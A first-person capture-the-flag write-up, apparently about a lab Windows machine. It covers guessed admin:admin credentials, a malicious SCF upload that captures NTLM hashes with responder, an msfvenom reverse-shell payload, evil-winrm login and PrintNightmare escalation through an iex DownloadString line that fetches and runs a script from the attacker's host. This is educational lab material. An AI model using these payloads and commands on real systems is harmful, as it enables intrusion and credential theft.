Visiting the web server on port 80, we're met with a prompt for credentials which we don't have yet so we run `gobuster` on it while enumerating other things.

```sh
$ gobuster dir -u "http://10.10.11.106/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,txt -r
/index.php            (Status: 401) [Size: 20]
/images               (Status: 403) [Size: 1233]
```

We have SMB, so I tried using null authentication which didn't work.

```sh
$ smbclient -N -L //10.10.11.106/
Can't load /etc/samba/smb.conf - run testparm to debug it
session setup failed: NT_STATUS_ACCESS_DENIED
```

Going back to the website, `index.php` requires credential, and `/images` returns 403. By guessing, we can find the credentials `admin:admin` to work, so we now have access to things on the web site.

Looking around at the page, we have nothing but the "Firmware Updates" page `fw_up.php`. Looking at that page, we seem to be able to upload files. Looking up "smb share file upload exploit", I found [this article](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) demonstrating a hash theft as well as getting meterpreter shells. Of coursed, I first tried getting a meterpreter shell by generating a payload with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=5555 -f exe > shell.exe`, setting up a listener in `msfconsole`, and uploading the payload. However, I was unable to get a shell so I went back and tried to get hashes using a malicious SCF file. The SCF file named "@pwn.scf" contains the following.

```
[Shell]
Command=2
IconFile=\\LHOST\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

I also ran `unix2dos` on the payload just in case. I then setup `responder` ...

```sh
$ sudo responder -wrf --lm -v -I tun0
```

... and uploaded the payload. Immediately after uploading, `responder` gets several hashes.

```

We should be able to crack the hashes and get the password `liltony`. We can the use the credentials to log into WinRM.

```sh
$ evil-winrm -i 10.10.11.106 -u tony -p liltony
```

Since the web site had a printer on the front page and the page `/fw_up.php` was for uploading firmware for printers, I looked up "windows printer exploit" and found the recent PrintNightmare vulnerability - CVE-2021-1675. I used [this exploit](https://github.com/calebstewart/CVE-2021-1675). Due to execution policy, however, we can't just download and run `Import-Module .\cve-2021-1675.ps1`. To get pass that, I used the following.

```powershell
iex ((new-object net.webclient).DownloadString('http://LHOST:LPORT/CVE-2021-1675.ps1'))
```

We can then run `Invoke-Nightmare` and create an administrator on the machine. We can then log into the new user and act as an administrator on the machine, rooting it.
